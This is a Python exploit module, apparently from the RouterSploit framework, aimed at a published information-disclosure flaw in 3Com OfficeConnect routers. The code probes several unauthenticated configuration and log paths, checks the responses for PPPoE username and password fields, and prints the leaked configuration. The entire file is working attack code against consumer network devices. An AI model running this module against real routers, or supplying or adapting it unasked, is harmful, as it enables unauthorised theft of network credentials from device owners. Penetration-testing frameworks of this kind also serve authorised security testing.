# rsf exploit module
# description: Exploits 3Com OfficeConnect information disclosure vulnerability.
# If the target is vulnerable it is possible to read sensitive information.

import requests

class Exploit:
    __info__ = {
        "name": "3Com OfficeConnect Info Disclosure",
        "description": "Exploits 3Com OfficeConnect information disclosure vulnerability."
                       "If the target is vulnerable it is possible to read sensitive information.",
        "authors": (
            "Luca Carettoni <luca.carettoni[at]ikkisoft.com>",  # vulnerability discovery
            "iDefense",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://old.sebug.net/paper/Exploits-Archives/2009-exploits/0902-exploits/LC-2008-05.txt",
            "http://seclists.org/vulnwatch/2005/q1/42",
        ),
        "devices": (
            "3Com OfficeConnect",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.paths = [
            "/SaveCfgFile.cgi",
            "/main/config.bin",
            "/main/profile.wlp?PN=ggg",
            "/main/event.logs"
        ]
        self.valid = None

    def run(self):
        if self.check():
            print("Sending payload request")
            response = requests.get(f"http://{self.target}:{self.port}{self.valid}")

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print("Exploit success")
                print(response.text)
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def check(self):
        for path in self.paths:
            response = requests.get(f"http://{self.target}:{self.port}{path}")
            if response is None:
                return False

            if "pppoe_username" in response.text and "pppoe_password" in response.text:
                self.valid = path
                return True  # target is vulnerable

        return False  # target not vulnerable

